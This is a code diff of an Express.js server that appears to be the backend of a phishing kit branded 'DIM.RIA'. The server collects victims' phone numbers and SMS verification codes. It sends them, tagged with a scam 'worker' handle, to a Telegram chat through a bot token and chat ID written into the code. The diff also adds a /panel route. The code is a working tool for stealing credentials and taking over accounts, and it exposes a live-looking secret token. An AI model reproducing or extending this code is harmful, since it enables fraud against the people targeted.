@@ -9,12 +9,17 @@ const port = process.env.PORT || 3000;
 // === КОНФІГУРАЦІЯ TELEGRAM ===
 const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
 const CHAT_ID = "-5055127448";
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;  // ← Исправлено: BOT_TOKEN
 // ==============================
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '/')));
+
+// === МАРШРУТ ДЛЯ ПАНЕЛІ ===
+app.get('/panel', (req, res) => {
+    res.sendFile(path.join(__dirname, 'panel.html'));
+});
 
 // Функція відправки в Telegram
 async function sendToTelegram(message) {
@@ -51,15 +56,11 @@ app.post('/api/send-data', async (req, res) => {
 
     if (step === 'phone' && phone) {
         message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина`;
-        if (referrer) {
-            message += `\n*Работник:* @${referrer}`;
-        }
+        if (referrer) message += `\n*Работник:* @${referrer}`;
     } 
     else if (step === 'code' && code) {
         message = `*SMS:*\n\`${code}\``;
-        if (referrer) {
-            message += `\n*Работник:* @${referrer}`;
-        }
+        if (referrer) message += `\n*Работник:* @${referrer}`;
     } 
     else {
         return res.status(400).json({ success: false, message: 'Невірні дані' });
